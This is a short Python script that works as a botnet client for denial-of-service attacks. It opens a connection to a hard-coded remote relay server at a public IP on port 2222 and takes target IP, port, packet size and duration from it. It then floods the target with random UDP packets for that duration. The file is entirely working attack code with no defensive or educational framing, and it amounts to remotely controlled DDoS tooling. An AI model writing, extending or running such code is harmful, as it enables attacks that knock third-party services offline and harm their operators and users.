import socket

# Relay server details
RELAY_SERVER_IP = '69.164.196.248'  # Change this to the actual IP of the relay server
RELAY_SERVER_PORT = 2222

def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((RELAY_SERVER_IP, RELAY_SERVER_PORT))
    
    try:
        while True:
            # Receive attack parameters from the relay server
            data = client_socket.recv(1024).decode()
            if not data:
                break

            ip, port, size, duration = data.split(',')
            print(f"Received attack parameters: IP={ip}, Port={port}, Size={size}, Duration={duration}")

            # Execute the attack
            udp_flood(ip, port, size, duration)
    finally:
        client_socket.close()

def udp_flood(ip, port, size, duration):
    import random
    import time

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes_to_send = random._urandom(int(size))

    timeout = time.time() + int(duration)
    sent_packets = 0

    print(f"Starting UDP flood on {ip}:{port} with {size}-byte packets for {duration} seconds.")
    
    while True:
        if time.time() > timeout:
            break
        sock.sendto(bytes_to_send, (ip, int(port)))
        sent_packets += 1

    print(f"Attack finished. Sent {sent_packets} packets.")

if __name__ == "__main__":
    start_client()

